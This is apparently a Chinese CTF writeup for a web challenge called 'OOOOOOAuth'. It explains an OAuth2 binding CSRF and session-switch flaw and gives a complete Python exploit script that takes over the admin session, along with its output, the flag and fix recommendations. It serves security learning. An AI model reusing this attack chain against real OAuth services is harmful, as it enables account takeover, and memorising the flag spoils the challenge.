# [个人队伍] CTF2026的Writeup

> **2026年00月00日00:00 ~ 2026年00月00日00:00**
>
> **比赛地址：https://match.ichunqiu.com/index?k=Wj4DYAtoC20FM1cxUmJSOVM0V2RROAU_BGABP1VgCz5VYFZl**
>
> **复现地址：https://match.ichunqiu.com/index?k=Wj4DYAtoC20FM1cxUmJSOVM0V2RROAU_BGABP1VgCz5VYFZl**

> 1、比赛时间：2026-09-13 13:00-17:00；上题时间：第一批13:00，第二批14:00。
>
> 2、比赛采用动态积分模式，每道题目初始分值500分，衰减后最低分值为50分，分数相同情况下，取答题时间短者。
>
> 3、解题思路提交：当天比赛结束后2小时内， 所有参赛队伍都需要上传提交每道赛题详细的解题报告（WriteUp） ，经组委会审核后，确定各参赛队最终得分和排名。逾期提交或不提交视为放弃本次比赛排名。
>
> 4、录屏：所有参赛选手在比赛时间内，需进行屏幕录制操作。录屏软件不做强制要求，录屏文件要能够清晰查看解题思路，严禁后期处理。录屏如果出现中断的情况，请在恢复后继续录屏操作，并记录录屏中断时间以及原因。所有队伍请本地保留录屏文件1周以上。



# All



## Web

### OOOOOOAuth

#### 题目介绍

> *题目分值：*50
>
> *我的得分：*50

#### 解题过程

> # OOOOOOAuth Writeup
>
> ## 题目信息
>
> - 类型：Web / OAuth2 授权码绑定逻辑缺陷
> - 入口：`https://<容器域名>:8000`，接口文档 `/docs`（FastAPI + OpenAPI）
> - 关键接口：`/register` `/login` `/profile` `/mock_oauth/authorize` `/mock_oauth/token` `/bind/start` `/bind/callback` `/admin/visit` `/flag`
>
> ## 漏洞点
>
> 1. **state 不绑定会话（绑定 CSRF）**
>    `/bind/start` 签发的 state 是双层 base64 包裹的 JWT，载荷仅为
>    `{"aud":"oauth:state","exp":...}`，不含用户/会话标识。任一账号获取的合法 state 可被任何会话使用。
>
> 2. **回调存在越权会话切换**
>    `/bind/callback` 处理一个**已绑定给他人**的 OAuth identity（code）时不报错，而是直接把当前会话切换为该 identity 的属主：
>
>    ```json
>    {"msg":"identity owned by admin, session switched","user":"admin"}
>    ```
>
> 3. `/admin/visit?url=` 机器人携带固定管理员会话，以 GET 访问**本机** http/https 地址（不跟随重定向、不回显响应体），可用于触发管理员侧的绑定 CSRF。
>
> ## 利用链
>
> ```
> 攻击者拿合法state → 匿名领一个全新code(未归属identity)
>    → /admin/visit 让管理员访问 callback，code 绑定到 admin
>    → 攻击者自己再访问同一 callback → 会话切换为 admin
>    → GET /flag
> ```
>
> 诱饵：`/admin/note` 泄露的 `Admin@2026!` 无法直接登录（bad credential）；`/backup/flag.txt` 为 404。
>
> ## 复现
>
> 保存为 `exploit.py`，将 `BASE` 改为当前容器地址后 `python exploit.py`：
>
> ```python
> import requests, urllib3, time, urllib.parse as up
> urllib3.disable_warnings()
> BASE = "https://<容器域名>:8000"
> 
> def req(s, m, p, **kw):
>     for _ in range(6):
>         r = s.request(m, BASE + p, timeout=20, allow_redirects=False, **kw)
>         if r.status_code != 502:
>             return r
>         time.sleep(1.5)
>     return r
> 
> # 1. 注册登录普通账号
> s = requests.Session(); s.verify = False
> u = "pwn_" + str(int(time.time()))
> req(s, "POST", "/register", data={"username": u, "password": "Pass@1234"})
> req(s, "POST", "/login",    data={"username": u, "password": "Pass@1234"})
> 
> # 2. 获取合法 state（不绑定会话）
> r  = req(s, "GET", "/bind/start")
> r2 = req(s, "GET", r.headers["location"])
> q  = dict(i.split("=", 1) for i in r2.headers["location"].split("?", 1)[1].split("&"))
> state = up.unquote(q["state"])
> 
> # 3. 匿名领取全新、未归属的 code
> a = requests.Session(); a.verify = False
> r = req(a, "GET", "/mock_oauth/authorize?" + up.urlencode(
>     {"client_id": "test", "redirect_uri": "/bind/callback", "state": state}))
> q = dict(i.split("=", 1) for i in r.headers["location"].split("?", 1)[1].split("&"))
> code = up.unquote(q["code"])
> 
> # 4. CSRF：管理员会话完成绑定 → identity 属主变为 admin
> cb = "/bind/callback?" + up.urlencode({"code": code, "state": state})
> print(req(s, "GET", "/admin/visit", params={"url": "http://127.0.0.1:8000" + cb}).json())
> time.sleep(2)
> 
> # 5. 攻击者消费同一 code → 会话切换为 admin
> print(req(s, "GET", cb).json())
> print(req(s, "GET", "/profile").json())
> 
> # 6. 取 flag（响应值为 base64）
> import base64
> out = req(s, "GET", "/flag").json()["flag"]
> print(out, "->", base64.b64decode(out).decode())
> ```
>
> ## 结果
>
> ```
> {'status': 'bot visited'}
> {'msg': 'identity owned by admin, session switched', 'user': 'admin'}
> {'user': 'admin', 'role': 'admin'}
> ZmxhZ3s4MGRjOTkxMC1hNjc3LTQ4NjctODliZi1iYmFlNjRkZmU2MTl9
> ```
>
> **Flag：`flag{80dc9910-a677-4867-89bf-bbae64dfe619}`**
>
> ## 修复建议
>
> - state 必须绑定服务端会话（如存入 session/一次性缓存），回调时校验归属并一次性使用；
> - 回调处理已绑定他人的 identity 时应拒绝，禁止“session switched”式静默切换；
> - 授权码 code 强制单次使用、绑定初始 `client_id`/会话；
> - 机器人 `/admin/visit` 对 callback 等敏感状态变更接口增加来源/CSRF 限制。

#### 题目答案

##### Flag

```flag
flag{80dc9910-a677-4867-89bf-bbae64dfe619}
```



# 队伍

## 名称

**菜鸟对对队**



## 口号

**对对对对对**



## 成员

### 队长

- **probie**

### 队员

- **probie**



## 留言

### probie

- **暂无**



## 成果

### 排名

- **0 / 0**

### 解题

- **0 / 0**

### 分数

- **0 / 0**